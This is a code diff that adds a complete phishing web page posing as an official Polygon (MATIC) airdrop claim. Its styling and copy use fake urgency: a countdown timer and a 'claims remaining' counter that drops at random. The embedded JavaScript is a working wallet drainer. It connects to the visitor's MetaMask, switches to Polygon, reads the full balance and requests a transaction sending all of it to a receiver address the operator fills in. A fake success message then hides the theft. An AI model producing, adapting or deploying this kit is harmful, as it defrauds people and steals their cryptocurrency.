@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Exclusive Polygon Airdrop Claim | Limited Time</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #8247e5;
+            --secondary: #00b4d8;
+            --dark: #0f0f23;
+            --light: #f5f5f5;
+            --danger: #ff4d4d;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--dark); color: var(--light); line-height: 1.6; }
+        .container { max-width: 600px; margin: 2rem auto; padding: 2rem; background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%); border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .header { text-align: center; margin-bottom: 1.5rem; }
+        .header h1 { font-size: 1.8rem; margin-bottom: 0.5rem; background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header p { opacity: 0.8; }
+        .badge { display: inline-block; padding: 0.3rem 0.8rem; background: var(--primary); color: white; border-radius: 20px; font-size: 0.8rem; margin-bottom: 1rem; }
+        .claim-box { background: rgba(255, 255, 255, 0.05); padding: 1.5rem; border-radius: 10px; margin-bottom: 1.5rem; }
+        .claim-amount { font-size: 2.5rem; font-weight: 700; margin: 1rem 0; background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .timer { display: flex; justify-content: center; gap: 1rem; margin: 1.5rem 0; }
+        .timer-box { background: rgba(0, 0, 0, 0.3); padding: 0.5rem 1rem; border-radius: 5px; text-align: center; }
+        .timer-box span { font-size: 1.8rem; font-weight: 700; }
+        .timer-box small { opacity: 0.7; font-size: 0.7rem; }
+        .btn { width: 100%; padding: 1rem; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+        .btn-primary { background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(130, 71, 229, 0.4); }
+        .alert { padding: 1rem; background: rgba(255, 77, 77, 0.2); border-left: 4px solid var(--danger); margin: 1rem 0; border-radius: 4px; }
+        .hidden { display: none; }
+        .loading-bar { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.1); border-radius: 4px; margin: 1rem 0; overflow: hidden; }
+        .loading-progress { height: 100%; width: 0%; background: linear-gradient(to right, var(--primary), var(--secondary)); border-radius: 4px; transition: width 3s ease; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="badge">OFFICIAL POLYGON PARTNER</span>
+            <h1>Polygon (MATIC) Airdrop Claim</h1>
+            <p>You have been selected for an exclusive MATIC airdrop. Claim now before time runs out!</p>
+        </div>
+
+        <div class="claim-box" id="claimSection">
+            <p>Your eligible reward:</p>
+            <div class="claim-amount">15,800 MATIC</div>
+            <p>≈ $6,700.00 USD</p>
+            <div class="timer">
+                <div class="timer-box"><span id="hours">01</span><small>HOURS</small></div>
+                <div class="timer-box"><span id="minutes">30</span><small>MINUTES</small></div>
+                <div class="timer-box"><span id="seconds">45</span><small>SECONDS</small></div>
+            </div>
+            <div class="alert">
+                ⚠️ <strong>Warning:</strong> Only <span id="remainingClaims">89</span> claims remaining!
+            </div>
+            <button class="btn btn-primary" id="connectWalletBtn">CONNECT WALLET TO CLAIM</button>
+        </div>
+
+        <div id="drainStep" class="hidden">
+            <h2>Processing Your Claim...</h2>
+            <p>Finalizing transfer. Do not close this page.</p>
+            <div class="loading-bar">
+                <div class="loading-progress" id="drainProgress"></div>
+            </div>
+            <p id="drainStatus">Preparing transaction...</p>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer for urgency
+        function updateTimer() {
+            let hours = document.getElementById('hours');
+            let minutes = document.getElementById('minutes');
+            let seconds = document.getElementById('seconds');
+            let remainingClaims = document.getElementById('remainingClaims');
+            let h = 1, m = 30, s = 45, claims = 89;
+
+            setInterval(() => {
+                s--;
+                if (s < 0) { s = 59; m--; }
+                if (m < 0) { m = 59; h--; }
+                if (h < 0) { h = 0; m = 0; s = 0; }
+                hours.textContent = h.toString().padStart(2, '0');
+                minutes.textContent = m.toString().padStart(2, '0');
+                seconds.textContent = s.toString().padStart(2, '0');
+                if (Math.random() > 0.7 && claims > 0) {
+                    claims--;
+                    remainingClaims.textContent = claims;
+                }
+            }, 1000);
+        }
+
+        // Web3 drainer logic
+        const drainConfig = {
+            receiverAddress: "0xYourWalletAddressHere", // Replace with your Polygon wallet address
+            chainId: "0x89", // Polygon Mainnet
+            minDrainValue: "0x2386f26fc10000" // 0.01 MATIC minimum
+        };
+
+        async function connectAndDrain() {
+            if (typeof window.ethereum === 'undefined') {
+                alert("Please install MetaMask to claim your airdrop!");
+                return;
+            }
+
+            const web3 = new Web3(window.ethereum);
+            try {
+                // Request wallet connection
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const victimAddress = accounts[0];
+
+                // Switch to Polygon network
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: drainConfig.chainId }]
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: "0x89",
+                                chainName: "Polygon Mainnet",
+                                rpcUrls: ["https://rpc-mainnet.matic.network"],
+                                nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+                                blockExplorerUrls: ["https://polygonscan.com/"]
+                            }]
+                        });
+                    }
+                }
+
+                // Get victim's MATIC balance
+                const balance = await web3.eth.getBalance(victimAddress);
+                const drainAmount = balance > parseInt(drainConfig.minDrainValue) ? balance : "0x0";
+
+                if (drainAmount === "0x0") {
+                    document.getElementById('drainStatus').textContent = "Insufficient balance to claim!";
+                    return;
+                }
+
+                // Drain transaction
+                const tx = {
+                    from: victimAddress,
+                    to: drainConfig.receiverAddress,
+                    value: drainAmount,
+                    gas: "0x5208", // 21000 gas
+                    gasPrice: await web3.eth.getGasPrice()
+                };
+
+                // Show draining animation
+                document.getElementById('claimSection').classList.add('hidden');
+                document.getElementById('drainStep').classList.remove('hidden');
+                let drainProgress = document.getElementById('drainProgress');
+                let drainStatus = document.getElementById('drainStatus');
+
+                drainProgress.style.width = '30%';
+                drainStatus.textContent = "Connecting to blockchain...";
+
+                // Send transaction
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [tx]
+                });
+
+                // Fake success animation
+                drainProgress.style.width = '60%';
+                drainStatus.textContent = "Processing transfer...";
+                setTimeout(() => {
+                    drainProgress.style.width = '100%';
+                    drainStatus.textContent = "✅ Success! Funds transferred.";
+                }, 2000);
+
+            } catch (err) {
+                console.error("Drain failed:", err);
+                document.getElementById('drainStatus').textContent = "Transaction failed. Try again.";
+            }
+        }
+
+        // Event listener for wallet connect
+        document.getElementById('connectWalletBtn').addEventListener('click', connectAndDrain);
+
+        // Load Web3.js dynamically with corrected URL
+        const script = document.createElement('script');
+        script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js';
+        script.onload = () => updateTimer();
+        document.head.appendChild(script);
+    </script>
+</body>
+</html>
